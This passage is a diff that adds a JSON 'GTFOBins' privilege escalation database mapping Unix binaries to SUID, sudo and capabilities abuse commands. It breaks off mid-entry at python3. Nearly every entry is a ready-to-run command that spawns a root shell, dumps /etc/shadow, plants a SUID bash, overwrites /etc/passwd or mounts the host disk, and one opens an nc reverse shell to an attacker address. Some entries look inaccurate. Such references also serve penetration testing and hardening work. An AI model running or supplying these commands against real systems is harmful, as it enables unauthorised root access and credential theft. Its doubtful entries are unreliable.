@@ -1,0 +1,1897 @@
+{
+  "version": "1.0.0",
+  "description": "GTFOBins database for privilege escalation",
+  "binaries": {
+    "aa-exec": {
+      "suid": {
+        "commands": ["./aa-exec /bin/sh -p"],
+        "description": "Spawn shell preserving SUID privileges"
+      }
+    },
+    "ab": {
+      "suid": {
+        "commands": ["./ab -P /etc/shadow http://localhost/"],
+        "description": "Read files via POST data"
+      }
+    },
+    "agetty": {
+      "suid": {
+        "commands": ["./agetty -o -p -l /bin/sh -a root tty"],
+        "description": "Spawn root shell via terminal"
+      }
+    },
+    "alpine": {
+      "suid": {
+        "commands": ["./alpine -F \"<CR><LF>!/bin/sh<CR>\""],
+        "description": "Escape to shell"
+      }
+    },
+    "ar": {
+      "suid": {
+        "commands": ["TF=$(mktemp -u); LFILE=/etc/shadow; ./ar r \"$TF\" \"$LFILE\"; cat \"$TF\""],
+        "description": "Read files via archive"
+      }
+    },
+    "arj": {
+      "suid": {
+        "commands": ["TF=$(mktemp -d); LFILE=/etc/shadow; LDIR=.; ./arj a \"$TF/a\" \"$LDIR\"; ./arj e \"$TF/a\" \"$LFILE\""],
+        "description": "Read files via archive"
+      }
+    },
+    "arp": {
+      "suid": {
+        "commands": ["./arp -v -f /etc/shadow"],
+        "description": "Read files"
+      }
+    },
+    "as": {
+      "suid": {
+        "commands": ["./as @/etc/shadow"],
+        "description": "Read files via error output"
+      }
+    },
+    "ascii-xfr": {
+      "suid": {
+        "commands": ["./ascii-xfr -ns /etc/shadow"],
+        "description": "Read files"
+      }
+    },
+    "ash": {
+      "suid": {
+        "commands": ["./ash -p"],
+        "description": "Spawn privileged shell"
+      },
+      "sudo": {
+        "commands": ["sudo ash"],
+        "description": "Spawn root shell"
+      }
+    },
+    "aspell": {
+      "suid": {
+        "commands": ["./aspell -c /etc/shadow"],
+        "description": "Read files via spell check"
+      }
+    },
+    "atobm": {
+      "suid": {
+        "commands": ["./atobm /etc/shadow 2>&1 | awk -F \"'\" '{print $2}'"],
+        "description": "Read files"
+      }
+    },
+    "awk": {
+      "suid": {
+        "commands": ["./awk 'BEGIN {system(\"/bin/sh -p\")}'"],
+        "description": "Spawn privileged shell"
+      },
+      "sudo": {
+        "commands": ["sudo awk 'BEGIN {system(\"/bin/sh\")}'"],
+        "description": "Spawn root shell"
+      },
+      "capabilities": {
+        "commands": ["./awk 'BEGIN {system(\"/bin/sh\")}'"],
+        "description": "Spawn shell with capabilities"
+      }
+    },
+    "base32": {
+      "suid": {
+        "commands": ["./base32 /etc/shadow | base32 -d"],
+        "description": "Read files"
+      }
+    },
+    "base64": {
+      "suid": {
+        "commands": ["./base64 /etc/shadow | base64 -d"],
+        "description": "Read files"
+      },
+      "sudo": {
+        "commands": ["sudo base64 /etc/shadow | base64 -d"],
+        "description": "Read files as root"
+      }
+    },
+    "basenc": {
+      "suid": {
+        "commands": ["./basenc --base64 /etc/shadow | basenc -d --base64"],
+        "description": "Read files"
+      }
+    },
+    "bash": {
+      "suid": {
+        "commands": ["./bash -p"],
+        "description": "Spawn privileged shell"
+      },
+      "sudo": {
+        "commands": ["sudo bash"],
+        "description": "Spawn root shell"
+      },
+      "capabilities": {
+        "commands": ["./bash -p"],
+        "description": "Spawn shell with capabilities"
+      }
+    },
+    "bc": {
+      "suid": {
+        "commands": ["./bc -s -e 'quit' < /etc/shadow"],
+        "description": "Read files via error"
+      }
+    },
+    "bridge": {
+      "suid": {
+        "commands": ["./bridge -b /etc/shadow"],
+        "description": "Read files"
+      }
+    },
+    "busctl": {
+      "suid": {
+        "commands": ["./busctl --user set-property org.freedesktop.DBus /org/freedesktop/DBus org.freedesktop.DBus.Debug.Stats EnableStats b true"],
+        "description": "Interact with D-Bus"
+      }
+    },
+    "busybox": {
+      "suid": {
+        "commands": ["./busybox sh -p"],
+        "description": "Spawn privileged shell"
+      },
+      "sudo": {
+        "commands": ["sudo busybox sh"],
+        "description": "Spawn root shell"
+      }
+    },
+    "bzip2": {
+      "suid": {
+        "commands": ["./bzip2 -c /etc/shadow | bzip2 -d"],
+        "description": "Read files"
+      }
+    },
+    "capsh": {
+      "suid": {
+        "commands": ["./capsh --gid=0 --uid=0 --"],
+        "description": "Spawn root shell"
+      },
+      "sudo": {
+        "commands": ["sudo capsh --"],
+        "description": "Spawn root shell"
+      }
+    },
+    "cat": {
+      "suid": {
+        "commands": ["./cat /etc/shadow"],
+        "description": "Read files"
+      },
+      "sudo": {
+        "commands": ["sudo cat /etc/shadow"],
+        "description": "Read files as root"
+      }
+    },
+    "chmod": {
+      "suid": {
+        "commands": ["./chmod 6777 /bin/bash"],
+        "description": "Change file permissions"
+      },
+      "sudo": {
+        "commands": ["sudo chmod 6777 /bin/bash"],
+        "description": "Set SUID on bash"
+      }
+    },
+    "chown": {
+      "suid": {
+        "commands": ["./chown $(id -un):$(id -gn) /etc/shadow"],
+        "description": "Change file ownership"
+      },
+      "sudo": {
+        "commands": ["sudo chown $(id -un):$(id -gn) /etc/shadow"],
+        "description": "Take ownership of files"
+      }
+    },
+    "chroot": {
+      "suid": {
+        "commands": ["./chroot / /bin/sh -p"],
+        "description": "Spawn privileged shell"
+      },
+      "sudo": {
+        "commands": ["sudo chroot / /bin/sh"],
+        "description": "Spawn root shell"
+      }
+    },
+    "cmp": {
+      "suid": {
+        "commands": ["./cmp /etc/shadow /dev/zero -b -l"],
+        "description": "Read files byte by byte"
+      }
+    },
+    "column": {
+      "suid": {
+        "commands": ["./column /etc/shadow"],
+        "description": "Read files"
+      }
+    },
+    "comm": {
+      "suid": {
+        "commands": ["./comm /etc/shadow /dev/null 2>/dev/null"],
+        "description": "Read files"
+      }
+    },
+    "cp": {
+      "suid": {
+        "commands": [
+          "./cp /bin/bash /tmp/bash; chmod +s /tmp/bash",
+          "./cp --preserve=mode /bin/bash /tmp/bash"
+        ],
+        "description": "Copy files or create SUID binary"
+      },
+      "sudo": {
+        "commands": ["sudo cp /bin/bash /tmp/bash; sudo chmod +s /tmp/bash"],
+        "description": "Create SUID bash"
+      }
+    },
+    "cpio": {
+      "suid": {
+        "commands": ["echo '/etc/shadow' | ./cpio -o | cpio -i --to-stdout"],
+        "description": "Read files via archive"
+      },
+      "sudo": {
+        "commands": ["echo '/etc/shadow' | sudo cpio -o | cpio -i --to-stdout"],
+        "description": "Read files as root"
+      }
+    },
+    "cpulimit": {
+      "suid": {
+        "commands": ["./cpulimit -l 100 -f /bin/sh -p"],
+        "description": "Spawn privileged shell"
+      },
+      "sudo": {
+        "commands": ["sudo cpulimit -l 100 -f /bin/sh"],
+        "description": "Spawn root shell"
+      }
+    },
+    "csh": {
+      "suid": {
+        "commands": ["./csh -b"],
+        "description": "Spawn privileged shell"
+      },
+      "sudo": {
+        "commands": ["sudo csh"],
+        "description": "Spawn root shell"
+      }
+    },
+    "csplit": {
+      "suid": {
+        "commands": ["./csplit /etc/shadow 1; cat xx00"],
+        "description": "Read files"
+      }
+    },
+    "csvtool": {
+      "suid": {
+        "commands": ["./csvtool col 1- /etc/shadow"],
+        "description": "Read files"
+      }
+    },
+    "cupsfilter": {
+      "suid": {
+        "commands": ["./cupsfilter -i application/octet-stream -m application/octet-stream /etc/shadow"],
+        "description": "Read files"
+      }
+    },
+    "curl": {
+      "suid": {
+        "commands": ["./curl file:///etc/shadow"],
+        "description": "Read files"
+      },
+      "sudo": {
+        "commands": ["sudo curl file:///etc/shadow"],
+        "description": "Read files as root"
+      }
+    },
+    "cut": {
+      "suid": {
+        "commands": ["./cut -d '' -f1 /etc/shadow"],
+        "description": "Read files"
+      }
+    },
+    "dash": {
+      "suid": {
+        "commands": ["./dash -p"],
+        "description": "Spawn privileged shell"
+      },
+      "sudo": {
+        "commands": ["sudo dash"],
+        "description": "Spawn root shell"
+      }
+    },
+    "date": {
+      "suid": {
+        "commands": ["./date -f /etc/shadow"],
+        "description": "Read files via error"
+      }
+    },
+    "dd": {
+      "suid": {
+        "commands": ["./dd if=/etc/shadow"],
+        "description": "Read files"
+      },
+      "sudo": {
+        "commands": ["sudo dd if=/etc/shadow"],
+        "description": "Read files as root"
+      }
+    },
+    "debugfs": {
+      "suid": {
+        "commands": ["./debugfs -w /dev/sda1 -R 'cat /etc/shadow'"],
+        "description": "Access filesystem directly"
+      },
+      "sudo": {
+        "commands": ["sudo debugfs -w /dev/sda1"],
+        "description": "Access filesystem as root"
+      }
+    },
+    "dialog": {
+      "suid": {
+        "commands": ["./dialog --textbox /etc/shadow 0 0"],
+        "description": "Read files"
+      }
+    },
+    "diff": {
+      "suid": {
+        "commands": ["./diff --line-format=%L /dev/null /etc/shadow"],
+        "description": "Read files"
+      }
+    },
+    "dig": {
+      "suid": {
+        "commands": ["./dig -f /etc/shadow"],
+        "description": "Read files via error"
+      }
+    },
+    "dmesg": {
+      "suid": {
+        "commands": ["./dmesg -F /etc/shadow"],
+        "description": "Read files via error"
+      },
+      "sudo": {
+        "commands": ["sudo dmesg -F /etc/shadow"],
+        "description": "Read files via error"
+      }
+    },
+    "dmsetup": {
+      "suid": {
+        "commands": ["./dmsetup create mycrypt --table '0 1 linear /dev/sda 0'"],
+        "description": "Create device mapper device"
+      },
+      "sudo": {
+        "commands": ["sudo dmsetup ls --exec '/bin/sh -s'"],
+        "description": "Execute shell"
+      }
+    },
+    "docker": {
+      "suid": {
+        "commands": ["./docker run -v /:/mnt --rm -it alpine chroot /mnt sh"],
+        "description": "Mount host filesystem and chroot"
+      },
+      "sudo": {
+        "commands": ["sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh"],
+        "description": "Mount host filesystem as root"
+      }
+    },
+    "dosbox": {
+      "suid": {
+        "commands": ["./dosbox -c 'mount c /' -c 'c:' -c 'type etc\\\\shadow'"],
+        "description": "Read files"
+      }
+    },
+    "ed": {
+      "suid": {
+        "commands": ["./ed /etc/shadow\\nP\\nq"],
+        "description": "Read files"
+      },
+      "sudo": {
+        "commands": ["sudo ed /etc/shadow"],
+        "description": "Edit files as root"
+      }
+    },
+    "emacs": {
+      "suid": {
+        "commands": ["./emacs -Q -nw --eval '(term \"/bin/sh -p\")'"],
+        "description": "Spawn privileged shell"
+      },
+      "sudo": {
+        "commands": ["sudo emacs -Q -nw --eval '(term \"/bin/sh\")'"],
+        "description": "Spawn root shell"
+      }
+    },
+    "env": {
+      "suid": {
+        "commands": ["./env /bin/sh -p"],
+        "description": "Spawn privileged shell"
+      },
+      "sudo": {
+        "commands": ["sudo env /bin/sh"],
+        "description": "Spawn root shell"
+      }
+    },
+    "eqn": {
+      "suid": {
+        "commands": ["./eqn /etc/shadow"],
+        "description": "Read files via error"
+      }
+    },
+    "espeak": {
+      "suid": {
+        "commands": ["./espeak -m -f /etc/shadow"],
+        "description": "Read files via speech"
+      }
+    },
+    "expand": {
+      "suid": {
+        "commands": ["./expand /etc/shadow"],
+        "description": "Read files"
+      }
+    },
+    "expect": {
+      "suid": {
+        "commands": ["./expect -c 'spawn /bin/sh -p;interact'"],
+        "description": "Spawn privileged shell"
+      },
+      "sudo": {
+        "commands": ["sudo expect -c 'spawn /bin/sh;interact'"],
+        "description": "Spawn root shell"
+      }
+    },
+    "file": {
+      "suid": {
+        "commands": ["./file -f /etc/shadow"],
+        "description": "Read files via error"
+      }
+    },
+    "find": {
+      "suid": {
+        "commands": ["./find . -exec /bin/sh -p \\; -quit"],
+        "description": "Spawn privileged shell"
+      },
+      "sudo": {
+        "commands": ["sudo find . -exec /bin/sh \\; -quit"],
+        "description": "Spawn root shell"
+      },
+      "capabilities": {
+        "commands": ["./find . -exec /bin/sh -p \\; -quit"],
+        "description": "Spawn shell with capabilities"
+      }
+    },
+    "finger": {
+      "suid": {
+        "commands": ["./finger @localhost | /bin/sh -p"],
+        "description": "Spawn shell (if malicious fingerd)"
+      }
+    },
+    "flock": {
+      "suid": {
+        "commands": ["./flock -u / /bin/sh -p"],
+        "description": "Spawn privileged shell"
+      },
+      "sudo": {
+        "commands": ["sudo flock -u / /bin/sh"],
+        "description": "Spawn root shell"
+      }
+    },
+    "fmt": {
+      "suid": {
+        "commands": ["./fmt /etc/shadow"],
+        "description": "Read files"
+      }
+    },
+    "fold": {
+      "suid": {
+        "commands": ["./fold /etc/shadow"],
+        "description": "Read files"
+      }
+    },
+    "ftp": {
+      "suid": {
+        "commands": ["./ftp\\n!/bin/sh -p"],
+        "description": "Escape to privileged shell"
+      },
+      "sudo": {
+        "commands": ["sudo ftp\\n!/bin/sh"],
+        "description": "Escape to root shell"
+      }
+    },
+    "gawk": {
+      "suid": {
+        "commands": ["./gawk 'BEGIN {system(\"/bin/sh -p\")}'"],
+        "description": "Spawn privileged shell"
+      },
+      "sudo": {
+        "commands": ["sudo gawk 'BEGIN {system(\"/bin/sh\")}'"],
+        "description": "Spawn root shell"
+      }
+    },
+    "gdb": {
+      "suid": {
+        "commands": ["./gdb -nx -ex 'python import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")' -ex quit"],
+        "description": "Spawn privileged shell"
+      },
+      "sudo": {
+        "commands": ["sudo gdb -nx -ex '!sh' -ex quit"],
+        "description": "Spawn root shell"
+      },
+      "capabilities": {
+        "commands": ["./gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit"],
+        "description": "Spawn root shell via setuid"
+      }
+    },
+    "genie": {
+      "suid": {
+        "commands": ["./genie -c /bin/sh"],
+        "description": "Spawn shell"
+      }
+    },
+    "getfacl": {
+      "suid": {
+        "commands": ["./getfacl /etc/shadow 2>&1"],
+        "description": "Reveal file existence"
+      }
+    },
+    "gimp": {
+      "suid": {
+        "commands": ["./gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system(\"/bin/sh -p\")'"],
+        "description": "Spawn privileged shell"
+      }
+    },
+    "git": {
+      "suid": {
+        "commands": ["./git diff --no-index /dev/null /etc/shadow"],
+        "description": "Read files"
+      },
+      "sudo": {
+        "commands": ["sudo git -p help config\\n!/bin/sh"],
+        "description": "Escape to root shell"
+      }
+    },
+    "grep": {
+      "suid": {
+        "commands": ["./grep '' /etc/shadow"],
+        "description": "Read files"
+      }
+    },
+    "gtester": {
+      "suid": {
+        "commands": ["./gtester -p /bin/sh /bin/sh"],
+        "description": "Spawn shell"
+      }
+    },
+    "gzip": {
+      "suid": {
+        "commands": ["./gzip -c -d /etc/shadow.gz"],
+        "description": "Read compressed files"
+      }
+    },
+    "hd": {
+      "suid": {
+        "commands": ["./hd /etc/shadow"],
+        "description": "Read files in hex"
+      }
+    },
+    "head": {
+      "suid": {
+        "commands": ["./head /etc/shadow"],
+        "description": "Read files"
+      }
+    },
+    "hexdump": {
+      "suid": {
+        "commands": ["./hexdump -C /etc/shadow"],
+        "description": "Read files in hex"
+      }
+    },
+    "highlight": {
+      "suid": {
+        "commands": ["./highlight /etc/shadow"],
+        "description": "Read files"
+      }
+    },
+    "hping3": {
+      "suid": {
+        "commands": ["./hping3\\n/bin/sh -p"],
+        "description": "Escape to privileged shell"
+      }
+    },
+    "iconv": {
+      "suid": {
+        "commands": ["./iconv -f 8859_1 -t 8859_1 /etc/shadow"],
+        "description": "Read files"
+      }
+    },
+    "iftop": {
+      "suid": {
+        "commands": ["./iftop\\n!/bin/sh -p"],
+        "description": "Escape to privileged shell"
+      }
+    },
+    "install": {
+      "suid": {
+        "commands": ["./install -m 6777 /bin/bash /tmp/bash"],
+        "description": "Create SUID binary"
+      },
+      "sudo": {
+        "commands": ["sudo install -m 6777 /bin/bash /tmp/bash"],
+        "description": "Create SUID bash"
+      }
+    },
+    "ionice": {
+      "suid": {
+        "commands": ["./ionice /bin/sh -p"],
+        "description": "Spawn privileged shell"
+      },
+      "sudo": {
+        "commands": ["sudo ionice /bin/sh"],
+        "description": "Spawn root shell"
+      }
+    },
+    "ip": {
+      "suid": {
+        "commands": ["./ip -force -batch /etc/shadow"],
+        "description": "Read files via error"
+      },
+      "sudo": {
+        "commands": ["sudo ip netns add foo\\nsudo ip netns exec foo /bin/sh"],
+        "description": "Spawn root shell in namespace"
+      }
+    },
+    "irb": {
+      "suid": {
+        "commands": ["./irb\\nexec '/bin/sh -p'"],
+        "description": "Spawn privileged shell"
+      }
+    },
+    "jjs": {
+      "suid": {
+        "commands": ["echo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)').waitFor()\" | ./jjs"],
+        "description": "Spawn privileged shell"
+      }
+    },
+    "join": {
+      "suid": {
+        "commands": ["./join -a 2 /dev/null /etc/shadow"],
+        "description": "Read files"
+      }
+    },
+    "journalctl": {
+      "suid": {
+        "commands": ["./journalctl\\n!/bin/sh -p"],
+        "description": "Escape to privileged shell"
+      },
+      "sudo": {
+        "commands": ["sudo journalctl\\n!/bin/sh"],
+        "description": "Escape to root shell"
+      }
+    },
+    "jq": {
+      "suid": {
+        "commands": ["./jq -Rr . /etc/shadow"],
+        "description": "Read files"
+      }
+    },
+    "jrunscript": {
+      "suid": {
+        "commands": ["./jrunscript -e \"exec('/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)')\""],
+        "description": "Spawn privileged shell"
+      }
+    },
+    "ksh": {
+      "suid": {
+        "commands": ["./ksh -p"],
+        "description": "Spawn privileged shell"
+      },
+      "sudo": {
+        "commands": ["sudo ksh"],
+        "description": "Spawn root shell"
+      }
+    },
+    "ksshell": {
+      "suid": {
+        "commands": ["./ksshell -i /etc/shadow"],
+        "description": "Read files"
+      }
+    },
+    "latex": {
+      "suid": {
+        "commands": ["./latex '\\input{|/bin/sh}'"],
+        "description": "Spawn shell (may require interaction)"
+      }
+    },
+    "ld.so": {
+      "suid": {
+        "commands": ["./ld.so /bin/sh -p"],
+        "description": "Spawn privileged shell"
+      }
+    },
+    "ldconfig": {
+      "suid": {
+        "commands": ["./ldconfig -f /etc/shadow"],
+        "description": "Read files via error"
+      }
+    },
+    "less": {
+      "suid": {
+        "commands": ["./less /etc/shadow\\n!/bin/sh -p"],
+        "description": "Read files and escape to shell"
+      },
+      "sudo": {
+        "commands": ["sudo less /etc/shadow\\n!/bin/sh"],
+        "description": "Read files and escape to root shell"
+      }
+    },
+    "logsave": {
+      "suid": {
+        "commands": ["./logsave /dev/null /bin/sh -i -p"],
+        "description": "Spawn privileged shell"
+      },
+      "sudo": {
+        "commands": ["sudo logsave /dev/null /bin/sh -i"],
+        "description": "Spawn root shell"
+      }
+    },
+    "look": {
+      "suid": {
+        "commands": ["./look '' /etc/shadow"],
+        "description": "Read files"
+      }
+    },
+    "ltrace": {
+      "suid": {
+        "commands": ["./ltrace -b -L /bin/sh -p"],
+        "description": "Spawn privileged shell"
+      }
+    },
+    "lua": {
+      "suid": {
+        "commands": ["./lua -e 'os.execute(\"/bin/sh -p\")'"],
+        "description": "Spawn privileged shell"
+      },
+      "sudo": {
+        "commands": ["sudo lua -e 'os.execute(\"/bin/sh\")'"],
+        "description": "Spawn root shell"
+      }
+    },
+    "lualatex": {
+      "suid": {
+        "commands": ["./lualatex -shell-escape '\\input{|/bin/sh}'"],
+        "description": "Spawn shell"
+      }
+    },
+    "luatex": {
+      "suid": {
+        "commands": ["./luatex -shell-escape '\\input{|/bin/sh}'"],
+        "description": "Spawn shell"
+      }
+    },
+    "lwp-download": {
+      "suid": {
+        "commands": ["./lwp-download file:///etc/shadow /dev/stdout"],
+        "description": "Read files"
+      }
+    },
+    "lwp-request": {
+      "suid": {
+        "commands": ["./lwp-request file:///etc/shadow"],
+        "description": "Read files"
+      }
+    },
+    "mail": {
+      "suid": {
+        "commands": ["./mail --exec='!/bin/sh -p'"],
+        "description": "Escape to privileged shell"
+      }
+    },
+    "make": {
+      "suid": {
+        "commands": ["./make -s --eval=$'x:\\n\\t-\"/bin/sh -p\"'"],
+        "description": "Spawn privileged shell"
+      },
+      "sudo": {
+        "commands": ["sudo make -s --eval=$'x:\\n\\t-\"/bin/sh\"'"],
+        "description": "Spawn root shell"
+      }
+    },
+    "man": {
+      "suid": {
+        "commands": ["./man man\\n!/bin/sh -p"],
+        "description": "Escape to privileged shell"
+      },
+      "sudo": {
+        "commands": ["sudo man man\\n!/bin/sh"],
+        "description": "Escape to root shell"
+      }
+    },
+    "mawk": {
+      "suid": {
+        "commands": ["./mawk 'BEGIN {system(\"/bin/sh -p\")}'"],
+        "description": "Spawn privileged shell"
+      }
+    },
+    "more": {
+      "suid": {
+        "commands": ["./more /etc/shadow\\n!/bin/sh -p"],
+        "description": "Read files and escape to shell"
+      },
+      "sudo": {
+        "commands": ["sudo more /etc/shadow\\n!/bin/sh"],
+        "description": "Read files and escape to root shell"
+      }
+    },
+    "mount": {
+      "suid": {
+        "commands": ["./mount -o bind /bin/bash /bin/mount\\n./mount -p"],
+        "description": "Bind mount and spawn shell"
+      },
+      "sudo": {
+        "commands": ["sudo mount -o bind /bin/sh /bin/mount"],
+        "description": "Bind mount shell"
+      }
+    },
+    "msgattrib": {
+      "suid": {
+        "commands": ["./msgattrib -P /etc/shadow"],
+        "description": "Read files via error"
+      }
+    },
+    "msgcat": {
+      "suid": {
+        "commands": ["./msgcat -P /etc/shadow"],
+        "description": "Read files via error"
+      }
+    },
+    "msgconv": {
+      "suid": {
+        "commands": ["./msgconv -P /etc/shadow"],
+        "description": "Read files via error"
+      }
+    },
+    "msgfilter": {
+      "suid": {
+        "commands": ["echo x | ./msgfilter -P /etc/shadow /bin/sh -c '/bin/sh -p 0<&2'"],
+        "description": "Spawn privileged shell"
+      }
+    },
+    "msgmerge": {
+      "suid": {
+        "commands": ["./msgmerge -P /etc/shadow /dev/null"],
+        "description": "Read files via error"
+      }
+    },
+    "msguniq": {
+      "suid": {
+        "commands": ["./msguniq -P /etc/shadow"],
+        "description": "Read files via error"
+      }
+    },
+    "mv": {
+      "suid": {
+        "commands": ["./mv /tmp/malicious /etc/passwd"],
+        "description": "Overwrite files"
+      },
+      "sudo": {
+        "commands": ["sudo mv /tmp/malicious /etc/passwd"],
+        "description": "Overwrite system files"
+      }
+    },
+    "mysql": {
+      "suid": {
+        "commands": ["./mysql -e '\\! /bin/sh -p'"],
+        "description": "Escape to privileged shell"
+      },
+      "sudo": {
+        "commands": ["sudo mysql -e '\\! /bin/sh'"],
+        "description": "Escape to root shell"
+      }
+    },
+    "nano": {
+      "suid": {
+        "commands": ["./nano\\n^R^X\\nreset; sh -p 1>&0 2>&0"],
+        "description": "Escape to privileged shell"
+      },
+      "sudo": {
+        "commands": ["sudo nano\\n^R^X\\nreset; sh 1>&0 2>&0"],
+        "description": "Escape to root shell"
+      }
+    },
+    "nasm": {
+      "suid": {
+        "commands": ["./nasm -@ /etc/shadow"],
+        "description": "Read files via error"
+      }
+    },
+    "nawk": {
+      "suid": {
+        "commands": ["./nawk 'BEGIN {system(\"/bin/sh -p\")}'"],
+        "description": "Spawn privileged shell"
+      }
+    },
+    "nc": {
+      "suid": {
+        "commands": ["./nc -e /bin/sh -p <attacker-ip> <port>"],
+        "description": "Reverse shell"
+      },
+      "sudo": {
+        "commands": ["sudo nc -e /bin/sh <attacker-ip> <port>"],
+        "description": "Root reverse shell"
+      }
+    },
+    "neofetch": {
+      "suid": {
+        "commands": ["TF=$(mktemp); echo 'exec /bin/sh -p' > $TF; ./neofetch --config $TF"],
+        "description": "Spawn privileged shell via config"
+      }
+    },
+    "nft": {
+      "suid": {
+        "commands": ["./nft -f /etc/shadow"],
+        "description": "Read files via error"
+      }
+    },
+    "nice": {
+      "suid": {
+        "commands": ["./nice /bin/sh -p"],
+        "description": "Spawn privileged shell"
+      },
+      "sudo": {
+        "commands": ["sudo nice /bin/sh"],
+        "description": "Spawn root shell"
+      }
+    },
+    "nl": {
+      "suid": {
+        "commands": ["./nl /etc/shadow"],
+        "description": "Read files"
+      }
+    },
+    "nm": {
+      "suid": {
+        "commands": ["./nm @/etc/shadow"],
+        "description": "Read files via error"
+      }
+    },
+    "nmap": {
+      "suid": {
+        "commands": ["./nmap --interactive\\n!sh -p"],
+        "description": "Escape to privileged shell (old versions)"
+      },
+      "sudo": {
+        "commands": ["TF=$(mktemp); echo 'os.execute(\"/bin/sh\")' > $TF; sudo nmap --script=$TF"],
+        "description": "Spawn root shell via script"
+      }
+    },
+    "node": {
+      "suid": {
+        "commands": ["./node -e 'require(\"child_process\").spawn(\"/bin/sh\", [\"-p\"], {stdio: [0, 1, 2]})'"],
+        "description": "Spawn privileged shell"
+      },
+      "sudo": {
+        "commands": ["sudo node -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'"],
+        "description": "Spawn root shell"
+      }
+    },
+    "nohup": {
+      "suid": {
+        "commands": ["./nohup /bin/sh -p -c \"sh -p <$(tty) >$(tty) 2>$(tty)\""],
+        "description": "Spawn privileged shell"
+      },
+      "sudo": {
+        "commands": ["sudo nohup /bin/sh -c \"sh <$(tty) >$(tty) 2>$(tty)\""],
+        "description": "Spawn root shell"
+      }
+    },
+    "ntpdate": {
+      "suid": {
+        "commands": ["./ntpdate -a /etc/shadow"],
+        "description": "Read files via error"
+      }
+    },
+    "od": {
+      "suid": {
+        "commands": ["./od -c /etc/shadow | od -c -r"],
+        "description": "Read files"
+      }
+    },
+    "openssl": {
+      "suid": {
+        "commands": ["./openssl enc -in /etc/shadow"],
+        "description": "Read files"
+      },
+      "sudo": {
+        "commands": ["sudo openssl enc -in /etc/shadow"],
+        "description": "Read files as root"
+      }
+    },
+    "openvpn": {
+      "suid": {
+        "commands": ["./openvpn --config /etc/shadow"],
+        "description": "Read files via error"
+      }
+    },
+    "pandoc": {
+      "suid": {
+        "commands": ["./pandoc -t plain /etc/shadow"],
+        "description": "Read files"
+      }
+    },
+    "paste": {
+      "suid": {
+        "commands": ["./paste /etc/shadow"],
+        "description": "Read files"
+      }
+    },
+    "pdflatex": {
+      "suid": {
+        "commands": ["./pdflatex -shell-escape '\\input{|/bin/sh}'"],
+        "description": "Spawn shell"
+      }
+    },
+    "pdftex": {
+      "suid": {
+        "commands": ["./pdftex -shell-escape '\\input{|/bin/sh}'"],
+        "description": "Spawn shell"
+      }
+    },
+    "perf": {
+      "suid": {
+        "commands": ["./perf stat /bin/sh -p"],
+        "description": "Spawn privileged shell"
+      }
+    },
+    "perl": {
+      "suid": {
+        "commands": ["./perl -e 'exec \"/bin/sh -p\";'"],
+        "description": "Spawn privileged shell"
+      },
+      "sudo": {
+        "commands": ["sudo perl -e 'exec \"/bin/sh\";'"],
+        "description": "Spawn root shell"
+      },
+      "capabilities": {
+        "commands": ["./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'"],
+        "description": "Spawn root shell via setuid"
+      }
+    },
+    "pg": {
+      "suid": {
+        "commands": ["./pg /etc/shadow\\n!/bin/sh -p"],
+        "description": "Read files and escape to shell"
+      }
+    },
+    "php": {
+      "suid": {
+        "commands": ["./php -r \"pcntl_exec('/bin/sh', ['-p']);\""],
+        "description": "Spawn privileged shell"
+      },
+      "sudo": {
+        "commands": ["sudo php -r \"system('/bin/sh');\""],
+        "description": "Spawn root shell"
+      },
+      "capabilities": {
+        "commands": ["./php -r \"posix_setuid(0); system('/bin/sh');\""],
+        "description": "Spawn root shell via setuid"
+      }
+    },
+    "pic": {
+      "suid": {
+        "commands": ["./pic -U\\n.PS\\nsh X sh -p X"],
+        "description": "Spawn privileged shell"
+      }
+    },
+    "pico": {
+      "suid": {
+        "commands": ["./pico\\n^R^X\\nreset; sh -p 1>&0 2>&0"],
+        "description": "Escape to privileged shell"
+      }
+    },
+    "pidstat": {
+      "suid": {
+        "commands": ["./pidstat -e /bin/sh -p"],
+        "description": "Spawn privileged shell"
+      }
+    },
+    "pip": {
+      "suid": {
+        "commands": ["TF=$(mktemp -d); echo \"import os; os.execl('/bin/sh', 'sh', '-p')\" > $TF/setup.py; ./pip install $TF"],
+        "description": "Spawn privileged shell via install"
+      },
+      "sudo": {
+        "commands": ["TF=$(mktemp -d); echo \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py; sudo pip install $TF"],
+        "description": "Spawn root shell"
+      }
+    },
+    "pkexec": {
+      "suid": {
+        "commands": ["./pkexec /bin/sh"],
+        "description": "Spawn root shell (requires auth or CVE-2021-4034)"
+      }
+    },
+    "pr": {
+      "suid": {
+        "commands": ["./pr /etc/shadow"],
+        "description": "Read files"
+      }
+    },
+    "pry": {
+      "suid": {
+        "commands": ["./pry -e 'exec \"/bin/sh -p\"'"],
+        "description": "Spawn privileged shell"
+      }
+    },
+    "psql": {
+      "suid": {
+        "commands": ["./psql -c '\\! /bin/sh -p'"],
+        "description": "Escape to privileged shell"
+      },
+      "sudo": {
+        "commands": ["sudo psql -c '\\! /bin/sh'"],
+        "description": "Escape to root shell"
+      }
+    },
+    "ptx": {
+      "suid": {
+        "commands": ["./ptx /etc/shadow"],
+        "description": "Read files (may be truncated)"
+      }
+    },
+    "python": {
+      "suid": {
+        "commands": ["./python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"],
+        "description": "Spawn privileged shell"
+      },
+      "sudo": {
+        "commands": ["sudo python -c 'import os; os.system(\"/bin/sh\")'"],
+        "description": "Spawn root shell"
+      },
+      "capabilities": {
+        "commands": ["./python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"],
+        "description": "Spawn root shell via setuid"
+      }
+    },
+    "python3": {
+      "suid": {
+        "commands": ["./python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"],
+        "description": "Spawn privileged shell"
+      },
+      "sudo": {
+        "commands": ["sudo python3 -c 'import os; os.system(\"/bin/sh\")'"],
+        "description": "Spawn root shell"
+      },
+      "capabilities": {
